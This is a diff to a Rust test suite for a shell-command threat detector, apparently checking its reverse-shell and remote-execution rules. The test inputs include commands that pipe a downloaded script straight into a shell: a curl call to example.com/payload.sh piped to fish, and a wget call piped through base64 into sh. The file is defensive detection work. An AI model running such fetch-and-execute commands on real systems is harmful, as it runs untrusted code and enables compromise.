@@ -22,7 +22,7 @@ async fn test_detect_bash_tcp_reverse() {
     match res_malicious {
         DetectResult::ThreatDetected(hits) => {
             assert_eq!(hits.len(), 1);
-            assert_eq!(hits.first().unwrap().0, *rules::RuleBashTcpUdpReverseShell1.meta());
+            assert_eq!(hits.first().unwrap().rule_meta, *rules::RuleBashTcpUdpReverseShell1.meta());
             println!("{hits:#?}")
         }
         _ => { panic!("Should be threat_detected bash_dev_tcp_reverse_shell_1") }
@@ -53,7 +53,7 @@ async fn test_detect_bash_tcp_reverse() {
 async fn test_detect_remote_execution() {
     let detector = get_detector();
 
-    let res = detector.detect("curl -s -H \"\"http://example.com/payload.sh | fish".to_string(), true, true).await;
+    let res = detector.detect("curl -s -H \"Cookie: token=7hHt4nuHEj8Y90RUfNnpcdRJWfwxlBykV6mdRYC2UZoDrXxYpV\" http://example.com/payload.sh | fish".to_string(), true, true).await;
     assert_eq!(res.max_severity(), Some(Severity::Medium));
 
     let res = detector.detect("wget -qO- http://192.168.1.1/script.sh | base64 -d | sh".to_string(), true, true).await;
